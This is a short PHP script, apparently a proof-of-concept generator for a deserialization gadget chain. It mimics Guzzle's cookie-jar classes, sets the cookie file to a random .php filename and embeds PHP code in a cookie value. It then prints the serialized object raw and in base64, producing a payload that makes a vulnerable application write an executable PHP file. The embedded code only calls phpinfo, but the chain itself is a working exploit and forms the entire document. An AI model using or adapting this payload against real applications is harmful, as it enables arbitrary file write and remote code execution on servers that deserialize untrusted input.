<?php

namespace GuzzleHttp\Cookie;

class SetCookie {
    private $data = ['Expires' => true, '\<?php phpinfo(INFO_LICENSE); ?>'];
}

class CookieJar implements \IteratorAggregate
{
    public function getIterator()
    {
        return new \ArrayIterator(array_values($this->cookies));
    }
    private $cookies = [];
    public function __construct() {
        $this->cookies[] = new SetCookie();
    }
}

class FileCookieJar extends CookieJar {
    private $filename = 'asdasda9126391837918237sdasd.php';
    private $storeSessionCookies = true;
}

$f = new \GuzzleHttp\Cookie\FileCookieJar();

echo serialize($f) . "\n\n";

echo base64_encode(serialize($f));
